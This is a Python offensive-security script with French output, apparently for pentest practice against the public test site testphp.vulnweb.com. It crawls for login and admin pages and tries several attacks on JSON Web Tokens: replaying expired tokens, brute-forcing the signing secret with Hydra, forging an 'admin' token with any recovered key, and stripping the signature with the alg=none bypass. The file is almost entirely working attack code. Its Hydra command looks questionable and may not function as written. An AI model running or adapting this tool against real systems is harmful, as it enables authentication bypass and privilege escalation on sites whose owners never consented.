import os
import jwt
import requests
import datetime
from bs4 import BeautifulSoup
import subprocess
import time
from threading import Thread, Event
import json
from base64 import urlsafe_b64decode, urlsafe_b64encode

# Configuration
SECRET_KEY = "super-secret-key"
BASE_URL = "http://testphp.vulnweb.com"
SENSITIVE_PATHS = ["login", "admin", "password", "cart", "checkout"]
HYDRA_PATH = "/usr/bin/hydra"  # Modifie ce chemin si besoin
WORDLIST_PATH = "wordlist.txt"
RESULTS_DIR = "results"
TIMEOUT = 300  # Timeout par défaut
JWT_FILE = "temp_jwt.txt"

class JWTScanner:
    def __init__(self):
        self.stop_event = Event()
        self.found_key = None
        self.hydra_process = None
        self.results = ""

        os.makedirs(RESULTS_DIR, exist_ok=True)

    def save_results(self):
        result_file = os.path.join(RESULTS_DIR, "scan_results.txt")
        with open(result_file, "w") as f:
            f.write("\n🔹 **Rapport complet de scan JWT** 🔹\n\n")
            f.write(self.results)
        print(f"\n✅ Rapport complet sauvegardé dans {result_file}")

    def save_compromised_key(self, jwt_token, key):
        result_file = os.path.join(RESULTS_DIR, "compromised_keys.txt")
        with open(result_file, "a") as f:
            f.write(f"\n🔓 Clé trouvée à {datetime.datetime.now()}\n")
            f.write(f"JWT original: {jwt_token}\n")
            f.write(f"Clé secrète: {key}\n")
            f.write("="*50 + "\n")
        print(f"\n🚨 Clé compromise sauvegardée dans {result_file}")

    def get_all_links(self, url):
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")
            links = [link.get("href") for link in soup.find_all("a", href=True)]
            return [BASE_URL + "/" + l if not l.startswith("http") else l for l in links]
        except Exception as e:
            print(f"[!] Erreur lors du scan: {e}")
            return []

    def detect_sensitive_pages(self, links):
        return [link for link in links if any(path in link for path in SENSITIVE_PATHS)]

    def generate_jwt(self, username, expired=False, secret=None):
        payload = {
            "user": username,
            "exp": datetime.datetime.utcnow() + datetime.timedelta(seconds=30) if not expired else datetime.datetime.utcnow() - datetime.timedelta(seconds=30)
        }
        token = jwt.encode(payload, secret or SECRET_KEY, algorithm="HS256")
        return token

    def test_jwt_token(self, url, token):
        try:
            response = requests.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
            return response.status_code == 200
        except:
            return False

    def run_hydra_attack(self, jwt_token, timeout):
        try:
            with open(JWT_FILE, "w") as f:
                f.write(jwt_token)

            cmd = [
                HYDRA_PATH,
                "-I",
                "-l", "''",
                "-P", WORDLIST_PATH,
                "-e", "ns",
                JWT_FILE,
                "jwt"
            ]

            self.hydra_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )

            start_time = time.time()

            while True:
                if self.stop_event.is_set() or (time.time() - start_time) > timeout:
                    if self.hydra_process:
                        self.hydra_process.terminate()
                    break

                return_code = self.hydra_process.poll()
                if return_code is not None:
                    break

                line = self.hydra_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                print(f"[Hydra] {line.strip()}")

                if "successfully completed" in line:
                    parts = line.split()
                    if len(parts) > 0:
                        self.found_key = parts[-1]
                        self.save_compromised_key(jwt_token, self.found_key)
                        break

            if os.path.exists(JWT_FILE):
                os.remove(JWT_FILE)

            return self.found_key

        except Exception as e:
            print(f"[!] Erreur Hydra: {e}")
            return None

    def start_hydra_attack(self, jwt_token, timeout):
        print(f"\n🔓 Lancement automatique de l'attaque Hydra (timeout: {timeout}s)")
        attack_thread = Thread(target=self.run_hydra_attack, args=(jwt_token, timeout))
        attack_thread.start()

        attack_thread.join(timeout)

        if attack_thread.is_alive():
            print("\n⏱️ Timeout atteint - Arrêt de l'attaque")
            self.stop_event.set()
            attack_thread.join()

        if self.found_key:
            print(f"\n🔑 Clé trouvée: {self.found_key}")
            return self.found_key
        else:
            print("\n❌ Aucune clé trouvée")
            return None

    def b64url_encode(self, data):
        return urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

    def modify_jwt(self, token, payload_changes={}, header_changes={}):
        try:
            header_b64, payload_b64, _ = token.split('.')

            header = json.loads(urlsafe_b64decode(header_b64 + '=' * (-len(header_b64) % 4)))
            payload = json.loads(urlsafe_b64decode(payload_b64 + '=' * (-len(payload_b64) % 4)))

            header.update(header_changes)
            header['alg'] = 'none'
            payload.update(payload_changes)

            new_header_b64 = self.b64url_encode(header)
            new_payload_b64 = self.b64url_encode(payload)

            modified_token = f"{new_header_b64}.{new_payload_b64}."

            return modified_token
        except Exception as e:
            print(f"[!] Erreur modification JWT: {e}")
            return None

    def run_scan(self):
        self.results += "\n🔹 **Début du scan JWT** 🔹\n"
        self.results += "\n🔍 Scan du site en cours...\n"
        all_links = self.get_all_links(BASE_URL)
        sensitive_pages = self.detect_sensitive_pages(all_links)

        self.results += f"\n📊 {len(all_links)} liens trouvés\n"
        self.results += f"🚨 {len(sensitive_pages)} pages sensibles détectées:\n"
        for page in sensitive_pages:
            self.results += f"- {page}\n"

        username = input("\n🔑 Entrez le nom d'utilisateur à tester: ")

        valid_token = self.generate_jwt(username)
        expired_token = self.generate_jwt(username, expired=True)

        self.results += "\n🔒 Tokens générés:\n"
        self.results += f"- Valide: {valid_token}\n"
        self.results += f"- Expiré: {expired_token}\n"

        self.results += "\n🔎 Test des tokens sur les pages sensibles:\n"
        for page in sensitive_pages:
            if self.test_jwt_token(page, valid_token):
                self.results += f"⚠️ Accès autorisé avec token valide sur {page}\n"
            if self.test_jwt_token(page, expired_token):
                self.results += f"🚨 Accès autorisé avec token expiré sur {page} (VULNÉRABILITÉ!)\n"

        # ➤ Lancement automatique d’Hydra
        found_key = self.start_hydra_attack(valid_token, TIMEOUT)

        if found_key:
            self.results += f"\n🔓 CLÉ TROUVÉE: {found_key}\n"
            admin_token = self.generate_jwt("admin", secret=found_key)
            self.results += f"\n🛠️ Token admin généré: {admin_token}\n"
            self.results += "\n🔎 Test du token admin:\n"
            for page in sensitive_pages:
                if self.test_jwt_token(page, admin_token):
                    self.results += f"🚨🚨 ACCÈS ADMIN AUTORISÉ sur {page} (VULNÉRABILITÉ CRITIQUE!)\n"

        # ➤ Test alg=none
        self.results += "\n🔧 Test de modification du token (none-alg attack):\n"
        modified_token = self.modify_jwt(valid_token, {"user": "admin"})
        if not modified_token:
            self.results += "❌ Échec lors de la génération du token modifié (none-alg)\n"
        else:
            self.results += f"- Token modifié: {modified_token}\n"
            for page in sensitive_pages:
                if self.test_jwt_token(page, modified_token):
                    self.results += f"🚨🚨 ACCÈS ADMIN via token modifié sur {page} (VULNÉRABILITÉ CRITIQUE!)\n"

if __name__ == "__main__":
    scanner = JWTScanner()
    scanner.run_scan()
    print(scanner.results)  # 🔹 Affiche le rapport complet dans le terminal
    scanner.save_results()
    input("\nAppuyez sur Entrée pour retourner au menu...")

